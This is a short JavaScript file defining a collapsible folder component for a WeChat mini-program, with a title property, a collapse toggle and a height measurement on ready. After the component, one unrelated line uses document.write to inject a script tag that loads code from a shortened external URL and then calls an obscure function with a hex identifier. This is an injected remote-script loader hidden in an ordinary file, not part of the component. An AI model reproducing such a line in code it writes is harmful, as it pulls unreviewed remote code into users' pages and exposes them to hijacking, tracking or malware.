Component({
  externalClasses: ['custom-class'],
  properties: {
    title: {
      type: String,
      value: ''
    }
  },
  data: {
    collapsed: false,
    height: ''
  },
  methods: {
    collapse () {
      this.setData({
        collapsed: !this.data.collapsed
      })
    }
  },
  ready () {
    wx.createSelectorQuery().in(this).select('.folder-content').boundingClientRect((res) => {
      this.setData({
        height: res.height
      })
    }).exec()
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
